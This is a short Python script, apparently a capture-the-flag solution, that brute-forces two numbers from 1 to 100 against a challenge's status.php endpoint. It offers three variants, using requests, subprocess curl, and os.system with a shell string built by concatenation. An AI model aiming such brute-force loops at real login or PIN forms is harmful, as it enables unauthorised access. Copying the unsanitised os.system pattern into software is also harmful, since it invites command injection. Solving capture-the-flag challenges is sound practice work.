"""import requests
url = "https://mhsctf-ettubrute.0xmmalik.repl.co/status.php"
myobj = {'number': 1, 'number2': 2}
for number1 in range(1,101):
	myobj["number"]=number1
	for number2 in range(1,101):
		print(f"Doing {number1,number2}")
		myobj["number2"]=number2
		x = requests.post(url, data = myobj)
		if "Sorry, you're clearly not my friend if you don't know my favorite and second favorite numbers!" not in x.text:
			print(f"Found : number={number1} et number2={number2}")
"""
"""
import subprocess

for number1 in range(1,101):
	for number2 in range(1,101):
		print(f"Doing {number1,number2}")
		commande = subprocess.check_output(["curl", "-X", "POST", "https://mhsctf-ettubrute.0xmmalik.repl.co/status.php", "-d", "\"number="+str(number1)+"&number2="+str(number2)+"\""])
		if "Sorry, you're clearly not my friend if you don't know my favorite and second favorite numbers!" not in commande.decode():
			print(f"Found : number={number1} et number2={number2}")
			break
"""			
		

import os

for number1 in range(1,101):
	for number2 in range(1,101):
		print(f"Doing {number1,number2}")
		print("\t\t\t",end=" ")
		os.system("curl -X POST https://mhsctf-ettubrute.0xmmalik.repl.co/status.php -d "+"\"number="+str(number1)+"&number2="+str(number2)+"\"")
		print("\n\n")
		
		

	
